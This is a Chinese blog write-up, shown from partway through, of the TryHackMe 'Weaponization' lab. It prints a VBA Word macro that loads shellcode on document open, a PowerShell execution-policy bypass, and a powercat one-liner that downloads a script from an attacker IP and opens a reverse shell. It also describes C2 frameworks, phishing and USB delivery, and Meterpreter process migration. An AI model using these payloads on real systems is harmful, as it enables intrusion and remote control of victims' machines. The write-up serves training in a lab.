<pre><code class="hljs scss"><span class="hljs-selector-id">#If</span> Vba7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Kuntsbgye As Long, ByVal Gmcygvnpd As Long, ByVal Ofrtwf As LongPtr, Zottuefr As Long, ByVal Nhlegnz As Long, Nopspbo As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Updmoar As Long, ByVal Ybijmv As Long, ByVal Qgtuzues As Long, ByVal Clhvgup As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Gxswqp As LongPtr, ByRef Qczd As Any, ByVal Blejylm As Long) As LongPtr
<span class="hljs-selector-id">#Else</span>
        Private Declare Function CreateThread Lib "kernel32" (ByVal Kuntsbgye As Long, ByVal Gmcygvnpd As Long, ByVal Ofrtwf As Long, Zottuefr As Long, ByVal Nhlegnz As Long, Nopspbo As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Updmoar As Long, ByVal Ybijmv As Long, ByVal Qgtuzues As Long, ByVal Clhvgup As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Gxswqp As Long, ByRef Qczd As Any, ByVal Blejylm As Long) As Long
<span class="hljs-selector-id">#EndIf</span>

Sub <span class="hljs-built_in">Auto_Open</span>()
        Dim Nkvk As Long, Nglfz As Variant, Cnmkevvvf As Long
<span class="hljs-selector-id">#If</span> Vba7 Then
        Dim  Dauujgm As LongPtr, Ecezevp As LongPtr
<span class="hljs-selector-id">#Else</span>
        Dim  Dauujgm As Long, Ecezevp As Long
<span class="hljs-selector-id">#EndIf</span>
        Nglfz = <span class="hljs-built_in">Array</span>(<span class="hljs-number">252</span>,<span class="hljs-number">232</span>,<span class="hljs-number">143</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">96</span>,<span class="hljs-number">49</span>,<span class="hljs-number">210</span>,<span class="hljs-number">137</span>,<span class="hljs-number">229</span>,<span class="hljs-number">100</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">48</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">12</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">20</span>,<span class="hljs-number">49</span>,<span class="hljs-number">255</span>,<span class="hljs-number">139</span>,<span class="hljs-number">114</span>,<span class="hljs-number">40</span>,<span class="hljs-number">15</span>,<span class="hljs-number">183</span>,<span class="hljs-number">74</span>,<span class="hljs-number">38</span>,<span class="hljs-number">49</span>,<span class="hljs-number">192</span>,<span class="hljs-number">172</span>,<span class="hljs-number">60</span>,<span class="hljs-number">97</span>,<span class="hljs-number">124</span>,<span class="hljs-number">2</span>,<span class="hljs-number">44</span>,<span class="hljs-number">32</span>,<span class="hljs-number">193</span>,<span class="hljs-number">207</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">199</span>,<span class="hljs-number">73</span>,<span class="hljs-number">117</span>,<span class="hljs-number">239</span>,<span class="hljs-number">82</span>,<span class="hljs-number">139</span>,<span class="hljs-number">82</span>,<span class="hljs-number">16</span>,<span class="hljs-number">139</span>,<span class="hljs-number">66</span>,<span class="hljs-number">60</span>,<span class="hljs-number">87</span>,<span class="hljs-number">1</span>,<span class="hljs-number">208</span>,<span class="hljs-number">139</span>,<span class="hljs-number">64</span>,<span class="hljs-number">120</span>,<span class="hljs-number">133</span>,<span class="hljs-number">192</span>,<span class="hljs-number">116</span>,<span class="hljs-number">76</span>,<span class="hljs-number">1</span>,<span class="hljs-number">208</span>,<span class="hljs-number">80</span>,<span class="hljs-number">139</span>,<span class="hljs-number">88</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>,<span class="hljs-number">211</span>,<span class="hljs-number">139</span>,<span class="hljs-number">72</span>,<span class="hljs-number">24</span>,<span class="hljs-number">133</span>,<span class="hljs-number">201</span>,<span class="hljs-number">116</span>,<span class="hljs-number">60</span>,<span class="hljs-number">73</span>,<span class="hljs-number">139</span>, _
<span class="hljs-number">52</span>,<span class="hljs-number">139</span>,<span class="hljs-number">1</span>,<span class="hljs-number">214</span>,<span class="hljs-number">49</span>,<span class="hljs-number">255</span>,<span class="hljs-number">49</span>,<span class="hljs-number">192</span>,<span class="hljs-number">172</span>,<span class="hljs-number">193</span>,<span class="hljs-number">207</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">199</span>,<span class="hljs-number">56</span>,<span class="hljs-number">224</span>,<span class="hljs-number">117</span>,<span class="hljs-number">244</span>,<span class="hljs-number">3</span>,<span class="hljs-number">125</span>,<span class="hljs-number">248</span>,<span class="hljs-number">59</span>,<span class="hljs-number">125</span>,<span class="hljs-number">36</span>,<span class="hljs-number">117</span>,<span class="hljs-number">224</span>,<span class="hljs-number">88</span>,<span class="hljs-number">139</span>,<span class="hljs-number">88</span>,<span class="hljs-number">36</span>,<span class="hljs-number">1</span>,<span class="hljs-number">211</span>,<span class="hljs-number">102</span>,<span class="hljs-number">139</span>,<span class="hljs-number">12</span>,<span class="hljs-number">75</span>,<span class="hljs-number">139</span>,<span class="hljs-number">88</span>,<span class="hljs-number">28</span>,<span class="hljs-number">1</span>,<span class="hljs-number">211</span>,<span class="hljs-number">139</span>,<span class="hljs-number">4</span>,<span class="hljs-number">139</span>,<span class="hljs-number">1</span>,<span class="hljs-number">208</span>,<span class="hljs-number">137</span>,<span class="hljs-number">68</span>,<span class="hljs-number">36</span>,<span class="hljs-number">36</span>,<span class="hljs-number">91</span>,<span class="hljs-number">91</span>,<span class="hljs-number">97</span>,<span class="hljs-number">89</span>,<span class="hljs-number">90</span>,<span class="hljs-number">81</span>,<span class="hljs-number">255</span>,<span class="hljs-number">224</span>,<span class="hljs-number">88</span>,<span class="hljs-number">95</span>,<span class="hljs-number">90</span>,<span class="hljs-number">139</span>,<span class="hljs-number">18</span>,<span class="hljs-number">233</span>,<span class="hljs-number">128</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">93</span>,<span class="hljs-number">104</span>,<span class="hljs-number">51</span>,<span class="hljs-number">50</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">104</span>,<span class="hljs-number">119</span>,<span class="hljs-number">115</span>,<span class="hljs-number">50</span>,<span class="hljs-number">95</span>,<span class="hljs-number">84</span>, _
<span class="hljs-number">104</span>,<span class="hljs-number">76</span>,<span class="hljs-number">119</span>,<span class="hljs-number">38</span>,<span class="hljs-number">7</span>,<span class="hljs-number">137</span>,<span class="hljs-number">232</span>,<span class="hljs-number">255</span>,<span class="hljs-number">208</span>,<span class="hljs-number">184</span>,<span class="hljs-number">144</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">41</span>,<span class="hljs-number">196</span>,<span class="hljs-number">84</span>,<span class="hljs-number">80</span>,<span class="hljs-number">104</span>,<span class="hljs-number">41</span>,<span class="hljs-number">128</span>,<span class="hljs-number">107</span>,<span class="hljs-number">0</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">106</span>,<span class="hljs-number">10</span>,<span class="hljs-number">104</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">81</span>,<span class="hljs-number">232</span>,<span class="hljs-number">104</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">21</span>,<span class="hljs-number">179</span>,<span class="hljs-number">137</span>,<span class="hljs-number">230</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">80</span>,<span class="hljs-number">64</span>,<span class="hljs-number">80</span>,<span class="hljs-number">64</span>,<span class="hljs-number">80</span>,<span class="hljs-number">104</span>,<span class="hljs-number">234</span>,<span class="hljs-number">15</span>,<span class="hljs-number">223</span>,<span class="hljs-number">224</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">151</span>,<span class="hljs-number">106</span>,<span class="hljs-number">16</span>,<span class="hljs-number">86</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">153</span>,<span class="hljs-number">165</span>,<span class="hljs-number">116</span>,<span class="hljs-number">97</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">133</span>,<span class="hljs-number">192</span>,<span class="hljs-number">116</span>,<span class="hljs-number">10</span>,<span class="hljs-number">255</span>,<span class="hljs-number">78</span>,<span class="hljs-number">8</span>,<span class="hljs-number">117</span>,<span class="hljs-number">236</span>,<span class="hljs-number">232</span>,<span class="hljs-number">103</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>, _
<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">106</span>,<span class="hljs-number">4</span>,<span class="hljs-number">86</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">2</span>,<span class="hljs-number">217</span>,<span class="hljs-number">200</span>,<span class="hljs-number">95</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">131</span>,<span class="hljs-number">248</span>,<span class="hljs-number">0</span>,<span class="hljs-number">126</span>,<span class="hljs-number">54</span>,<span class="hljs-number">139</span>,<span class="hljs-number">54</span>,<span class="hljs-number">106</span>,<span class="hljs-number">64</span>,<span class="hljs-number">104</span>,<span class="hljs-number">0</span>,<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">104</span>,<span class="hljs-number">88</span>,<span class="hljs-number">164</span>,<span class="hljs-number">83</span>,<span class="hljs-number">229</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">147</span>,<span class="hljs-number">83</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">83</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">2</span>,<span class="hljs-number">217</span>,<span class="hljs-number">200</span>,<span class="hljs-number">95</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">131</span>,<span class="hljs-number">248</span>,<span class="hljs-number">0</span>,<span class="hljs-number">125</span>,<span class="hljs-number">40</span>,<span class="hljs-number">88</span>,<span class="hljs-number">104</span>,<span class="hljs-number">0</span>,<span class="hljs-number">64</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">80</span>,<span class="hljs-number">104</span>,<span class="hljs-number">11</span>,<span class="hljs-number">47</span>,<span class="hljs-number">15</span>,<span class="hljs-number">48</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>,<span class="hljs-number">87</span>,<span class="hljs-number">104</span>,<span class="hljs-number">117</span>,<span class="hljs-number">110</span>,<span class="hljs-number">77</span>,<span class="hljs-number">97</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>, _
<span class="hljs-number">94</span>,<span class="hljs-number">94</span>,<span class="hljs-number">255</span>,<span class="hljs-number">12</span>,<span class="hljs-number">36</span>,<span class="hljs-number">15</span>,<span class="hljs-number">133</span>,<span class="hljs-number">112</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">233</span>,<span class="hljs-number">155</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">1</span>,<span class="hljs-number">195</span>,<span class="hljs-number">41</span>,<span class="hljs-number">198</span>,<span class="hljs-number">117</span>,<span class="hljs-number">193</span>,<span class="hljs-number">195</span>,<span class="hljs-number">187</span>,<span class="hljs-number">240</span>,<span class="hljs-number">181</span>,<span class="hljs-number">162</span>,<span class="hljs-number">86</span>,<span class="hljs-number">106</span>,<span class="hljs-number">0</span>,<span class="hljs-number">83</span>,<span class="hljs-number">255</span>,<span class="hljs-number">213</span>)

        Dauujgm = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-number">0</span>, UBound(Nglfz), &amp;H1000, &amp;H40)
        For Cnmkevvvf = <span class="hljs-built_in">LBound</span>(Nglfz) To <span class="hljs-built_in">UBound</span>(Nglfz)
                Nkvk = <span class="hljs-built_in">Nglfz</span>(Cnmkevvvf)
                Ecezevp = <span class="hljs-built_in">RtlMoveMemory</span>(Dauujgm + Cnmkevvvf, Nkvk, <span class="hljs-number">1</span>)
        Next Cnmkevvvf
        Ecezevp = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, Dauujgm, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
End Sub
Sub <span class="hljs-built_in">AutoOpen</span>()
        Auto_Open
End Sub
Sub <span class="hljs-built_in">Document_Open</span>()
        Auto_Open
End Sub</code></pre>
<p>记得攻击机上开启msfconsole的handler监听模块</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135312.png" alt="image-20240714105602323"></p>
<h1 id="0x06-powershell-psh">0x06 PowerShell (PSH)</h1>
<h2 id="powershell-psh">PowerShell (PSH)</h2>
<p>PowerShell 是一种面向对象的编程语言，从 .NET 中的动态语言运行时 (DLR) 执行，但遗留用途有一些例外。<a target="_blank" rel="noopener" href="https://tryhackme.com/room/powershell">查看 TryHackMe 房间“使用 PowerShell 进行黑客攻击”</a>，了解有关 PowerShell 的更多信息.</p>
<p>红队人员依靠 PowerShell 执行各种活动，包括初始访问、系统枚举等。首先，我们创建一个简单的 PowerShell 脚本，用于打印“欢迎来到武器化室！”如下，</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">Write-Output</span> <span class="hljs-string">"Welcome to the Weaponization Room!"</span></code></pre>
<p>将文件另存为 thm.ps1。通过写入输出，我们打印消息“欢迎来到武器化室！”到命令提示符。现在让我们运行它并查看结果。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135313.png" alt="image-20240714110104387"></p>
<h2 id="execution-policy">Execution Policy</h2>
<p>PowerShell 的执行策略是一个安全选项，用于保护系统免遭恶意脚本的运行。默认情况下，出于安全目的，Microsoft 禁用执行 PowerShell 脚本 .ps1。 PowerShell 执行策略设置为“受限”，这意味着它允许单个命令，但不允许运行任何脚本。</p>
<p>您可以按如下方式确定 Windows 当前的 PowerShell 设置：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135314.png" alt="image-20240714110153684"></p>
<p>我们还可以通过运行以下命令轻松更改 PowerShell 执行策略：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135315.png" alt="image-20240714110255792"></p>
<p>之后选Yes to All即可</p>
<h2 id="bypass-execution-policy">Bypass Execution Policy</h2>
<p>Microsoft 提供了禁用此限制的方法。其中一种方法是为 PowerShell 命令提供参数选项，将其更改为您所需的设置。例如，我们可以将其更改为绕过策略，这意味着没有任何内容被阻止或限制。这很有用，因为它可以让我们运行自己的 PowerShell 脚本。</p>
<p>为了确保我们的 PowerShell 文件得到执行，我们需要在参数中提供绕过选项，如下所示：</p>
<pre><code class="hljs scss">powershell -ex bypass -File thm<span class="hljs-selector-class">.ps1</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135316.png" alt="image-20240714110450893"></p>
<p>现在，让我们尝试使用 PowerShell 编写的工具之一（powercat）来获取反向 shell。在您的 AttackBox 上，从 GitHub 下载它并运行网络服务器来传递有效负载。</p>
<pre><code class="hljs scss">git clone https://github.com/besimorhino/powercat.git</code></pre>
<p>攻击机开启监听</p>
<pre><code class="hljs scss">powershell -c "<span class="hljs-built_in">IEX</span>(New-Object System.Net.WebClient)<span class="hljs-selector-class">.DownloadString</span>('http://<span class="hljs-number">10.11</span>.<span class="hljs-number">81.232</span>:<span class="hljs-number">8000</span>/powercat.ps1');powercat -c <span class="hljs-number">10.11</span><span class="hljs-selector-class">.81</span><span class="hljs-selector-class">.232</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8888</span> -e cmd"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135317.png" alt="image-20240714111239853"></p>
<h1 id="0x07-c2">0x07 C2</h1>
<p>此任务介绍红队行动中使用的命令和控制 (C2) 框架的基本概念。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135318.png" alt="image-20240714111302518"></p>
<h2 id="什么是c2">什么是C2？</h2>
<p>C2 框架是后利用框架，允许红队成员协作并控制受感染的机器。 C2 被认为是红队人员在进攻性网络行动中最重要的工具之一。 C2 框架提供快速、直接的方法来：</p>
<ul>
<li>生成各种恶意负载</li>
<li>枚举受感染的机器/网络</li>
<li>Perform privilege escalation and pivoting<br>
执行权限升级和旋转</li>
<li>Lateral movement</li>
<li>And many others</li>
</ul>
<p>我们将简要介绍的一些流行的 C2 框架包括 Cobalt Strike、PowerShell Empire、Metasploit。这些框架中的大多数旨在支持一个方便的环境，以便在获得系统的初始访问权限后，红队操作之间可以进行共享和通信。</p>
<h2 id="cobalt-strike">Cobalt Strike</h2>
<p>Cobalt Strike 是一个专注于对手模拟和红队行动的商业框架。它是远程访问工具、后利用功能和独特的报告系统的组合。它为代理提供了先进的技术来建立秘密通信并执行各种操作，包括键盘记录、文件上传和下载、VPN 部署、权限升级技术、mimikatz、端口扫描和最先进的横向移动。</p>
<h2 id="powershell-empire">PowerShell Empire</h2>
<p>PowerShell Empire 是一个开源框架，可帮助红队操作员和渗透测试人员使用密钥和共享密码跨多个服务器进行协作。它是一个基于PowerShell和Python代理的开发框架。 PowerShell Empire 专注于 Windows 和 Active Directory 环境的客户端和后期开发。如果您想了解有关 PowerShell Empire 的更多信息，我们建议您尝试一下这个房间：<a target="_blank" rel="noopener" href="https://tryhackme.com/room/rppsempire">Empire</a>。</p>
<h2 id="metasploit-元分析软件">Metasploit 元分析软件</h2>
<p>Metasploit 是一种广泛使用的漏洞利用框架，它提供了各种技术和工具来轻松执行黑客攻击。它是一个开源框架，被认为是渗透测试和红队运营的主要工具之一。 Metasploit 是我们在这个房间中使用的工具之一，用于为我们的武器化阶段生成有效负载。如果您想了解有关 Metasploit 框架的更多信息，我们建议您查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/module/metasploit">Metasploit 模块</a>。</p>
<p>大多数 C2 框架都使用本房间提到的技术作为初始访问阶段的准备。有关 C2 框架的更多详细信息，我们邀请您查看 <a target="_blank" rel="noopener" href="https://tryhackme.com/room/introtoc2">C2 简介室</a>。</p>
<h1 id="0x08-delivery-techniques">0x08 Delivery Techniques</h1>
<p>交付技术是获得初始访问的重要因素之一。他们必须让受害者看起来专业、合法且令人信服，才能贯彻执行内容。</p>
<h2 id="email-delivery">Email Delivery</h2>
<p>这是通过发送带有链接或附件的网络钓鱼电子邮件来发送有效负载的常用方法。欲了解更多信息，<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1566/001/">请访问此处</a>。此方法会附加一个恶意文件，该文件可能是我们之前提到的类型。目标是说服受害者访问恶意网站或下载并运行恶意文件，以获得对受害者网络或主机的初始访问权限。</p>
<p>红队成员应该拥有自己的用于网络钓鱼目的的基础设施。根据红队参与要求，需要在电子邮件服务器内设置各种选项，包括域名密钥识别邮件 (DKIM)、发件人策略框架 (SPF) 和 DNS 指针 (PTR) 记录。</p>
<p>红队成员还可以使用第三方电子邮件服务，例如 Google Gmail、Outlook、Yahoo 以及其他声誉良好的服务。</p>
<p>另一种有趣的方法是使用公司内受损的电子邮件帐户向公司内部或其他人发送网络钓鱼电子邮件。受损的电子邮件可能会通过网络钓鱼或其他技术（例如密码喷射攻击）遭到黑客攻击。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135319.png" alt="image-20240714111810932"></p>
<h2 id="web-delivery">Web Delivery</h2>
<p>另一种方法是在红队成员控制的网络服务器上托管恶意负载。 Web 服务器必须遵循安全准则，例如其域名和 TLS（传输层安全）证书的干净记录和声誉。欲了解更多信息，<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1189/">请访问此处</a>。</p>
<p>此方法包括其他技术，例如通过社会工程让受害者访问或下载恶意文件。使用此方法时，URL 缩短器可能会有所帮助。</p>
<p>在该方法中，可以组合和使用其他技术。攻击者可以利用0day漏洞，例如利用 Java 或浏览器等易受攻击的软件，将其用于网络钓鱼电子邮件或 Web 交付技术，从而获得对受害计算机的访问权限。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135320.png" alt="image-20240714111908463"></p>
<h2 id="usb-delivery">USB Delivery</h2>
<p>这种方法需要受害者物理插入恶意USB。在对手可以分发 USB 的会议或活动中，此方法可能有效且有用。有关 USB 传输的更多信息，<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1091/">请访问此处</a>。</p>
<p>通常，组织会制定强有力的策略，例如出于安全目的在其组织环境中禁用 USB 使用。而其他组织允许在目标环境中使用它。</p>
<p>用于武器化 USB 设备的常见 USB 攻击包括 <a target="_blank" rel="noopener" href="https://shop.hak5.org/products/usb-rubber-ducky-deluxe">Rubber Ducky</a> 和 ​​<a target="_blank" rel="noopener" href="https://www.minitool.com/news/usbharpoon.html">USBHarpoon</a>、充电 USB 电缆（例如 <a target="_blank" rel="noopener" href="https://shop.hak5.org/products/omg-cable">O.MG Cable</a>）.</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135321.png" alt="image-20240714112123207"></p>
<h1 id="0x09-练习">0x09 练习</h1>
<p>我们准备了一台 Windows 10 计算机，该计算机运行用户模拟 Web 应用程序来执行您的有效负载或自动访问恶意 HTA 链接。部署连接的计算机并等待几分钟，直到其启动并运行。然后，访问用户模拟器 Web 应用程序：http://MACHINE_IP:8080/.</p>
<p>确保从 AttackBox 访问用户模拟器 Web 应用程序，或者您可以通过连接到 VPN 来访问它。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135322.png" alt="image-20240714112447273"></p>
<p>Web 应用程序允许将有效负载上传为 VBS、DOC、PS1 文件。此外，如果您提供恶意 HTA 链接，Web 应用程序将访问您的链接。</p>
<p>Doc 文件注意：在提供的 Windows 10 机器中使用的模拟将打开恶意 Word 文档并在 90 秒内关闭。为了获得更长时间的预知，您需要在收到返回连接后立即迁移。</p>
<p>在Metasploit框架中，我们可以使用migrate将当前进程注入到受害机器上的另一个进程中。在我们的例子中，我们需要将当前进程（即 MS Word 文档）迁移到另一个进程，以使连接稳定，即使 MS Word 文档关闭也是如此。最简单的方法是使用迁移后模块，如下所示，</p>
<pre><code class="hljs scss">meterpreter &gt; run post/windows/manage/migrate 

<span class="hljs-selector-attr">[*]</span> Running module against DESKTOP-<span class="hljs-number">1</span>AU6NT4
<span class="hljs-selector-attr">[*]</span> Current server process: svchost.exe (<span class="hljs-number">3280</span>)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID <span class="hljs-number">0</span>
[*] Migrating into <span class="hljs-number">4960</span>
[+] Successfully migrated into process <span class="hljs-number">4960</span></code></pre>
<p>在此任务中，目标是生成您选择的反向 shell 负载并通过 Web 应用程序发送它。一旦 Web 应用程序运行您的有效负载，您应该会收到返回的连接。回答下面的问题，并在收到反向 shell 后找到该标志来证明您的访问权限。</p>
<p>作为参考，您可以使用本网站上的 <a target="_blank" rel="noopener" href="https://web.archive.org/web/20220607215637/https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/">MSFVenom 备忘单</a>。</p>
<p>这里使用的msfconsole的hta</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135323.png" alt="image-20240714113232128"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135324.png" alt="image-20240714113206433"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407141135325.png" alt="image-20240714113405110"></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/07/12/thm-weaponization/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/07/12/thm-weaponization/')">THM-Weaponization</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/07/12/thm-weaponization/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-Weaponization&amp;url=http://hybcx.xyz/2024/07/12/thm-weaponization/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
